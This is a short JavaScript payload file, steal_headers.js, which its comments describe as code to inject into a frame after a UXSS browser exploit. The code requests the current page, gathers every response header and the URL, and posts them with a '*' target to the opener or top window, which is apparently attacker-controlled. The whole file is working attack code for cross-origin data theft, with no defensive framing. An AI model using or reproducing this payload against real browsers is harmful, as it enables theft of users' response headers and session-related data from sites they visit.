/* steal_headers.js: can be injected into a frame/window after a UXSS */
/* exploit to steal the response headers of the loaded URL.           */

/* send an XHR request to our current page */
var x = new XMLHttpRequest;
x.open('GET', window.location.href, true);
x.onreadystatechange = function() {
  /* when the XHR request is complete, grab the headers and send them back */
  if (x.readyState == 2) {
    (opener||top).postMessage(JSON.stringify({
      headers: x.getAllResponseHeaders(),
      url: window.location.href,
      send: true
    }), '*');
  }
};
x.send();
